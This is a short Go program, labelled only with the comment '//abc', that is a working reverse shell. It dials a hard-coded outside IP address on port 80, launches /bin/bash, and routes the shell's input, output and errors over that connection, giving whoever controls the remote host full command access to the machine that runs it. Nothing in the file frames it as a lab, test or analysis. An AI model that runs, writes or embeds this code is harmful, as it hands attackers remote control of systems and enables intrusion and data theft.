//abc
package main;
import ("net"; "os/exec");                                                                                                                                                           
func main() {                                                                                                                                                                        
   c, _ := net.Dial("tcp", "34.27.46.79:80");                                                                                                                                     
   cmd := exec.Command("/bin/bash");                                                                                                                                                   
   cmd.Stdin = c;                                                                                                                                                                    
   cmd.Stdout = c;                                                                                                                                                                   
   cmd.Stderr = c;                                                                                                                                                                   
   cmd.Run()                                                                                                                                                                         
   }
   
